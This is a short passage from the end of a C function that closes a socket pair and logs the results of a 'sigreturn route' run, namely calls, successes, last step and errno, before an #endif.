  }

  close(sv[0]);
  close(sv[1]);
  pr_info("sigreturn route done calls=%d success=%d step=%d errno=%d\n",
          calls, success, route_last_step, route_last_errno);
  (void)winner;
}
#endif

